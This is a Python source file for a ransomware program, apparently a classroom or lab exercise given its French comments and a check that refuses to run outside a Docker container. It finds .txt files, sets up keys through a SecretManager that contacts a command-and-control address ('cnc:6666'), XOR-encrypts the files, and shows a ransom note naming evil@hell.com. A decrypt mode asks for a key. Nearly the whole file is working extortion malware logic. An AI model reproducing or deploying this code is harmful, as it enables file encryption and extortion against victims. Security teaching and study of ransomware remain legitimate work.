import logging
import socket
import re
import sys
from pathlib import Path
from sources.secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
    # At first, we check if we are in a docker
    # to prevent running this program outside of container
        hostname = str(socket.gethostname())  # Conversion en chaîne de caractères
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)



    def get_files(self, filter:str)->list:
        # return all files matching the filter
        files = []
        for file_path in Path(".").rglob(filter):
            if file_path.is_file():
                files.append(str(file_path.absolute()))
        return files
        

    def encrypt(self):
        # Liste tous les fichiers .txt
        txt_files = self.get_files("*.txt")

        # Crée une instance de SecretManager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        # Appelle la méthode setup() de SecretManager
        secret_manager.setup()

        # Chiffre les fichiers en utilisant la méthode xorfiles() de SecretManager
        secret_manager.xorfiles(txt_files)

        # Affiche un message demandant à la victime de contacter l'attaquant, incluant le jeton en hexadécimal
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))


    def decrypt(self):
        # Crée une instance de SecretManager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        # Charge les éléments cryptographiques locaux
        secret_manager.load()

        # Liste tous les fichiers .txt
        txt_files = self.get_files("*.txt")

        while True:
            try:
                # Demande la clé de décryptage
                key = input("Entrez la clé pour décrypter vos fichiers : ")

                # Définit la clé
                secret_manager.set_key(key)

                # Décrypte les fichiers en utilisant la méthode xorfiles() de SecretManager
                secret_manager.xorfiles(txt_files)

                # Nettoie les fichiers cryptographiques locaux
                secret_manager.clean()

                # Informe l'utilisateur que le décryptage a réussi
                print("Décryptage réussi ! Vos fichiers ont été restaurés.")

                # Quitte le ransomware
                break
            except ValueError:
                # Informe l'utilisateur que la clé est invalide
                print("Clé invalide. Veuillez réessayer.")
        

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
        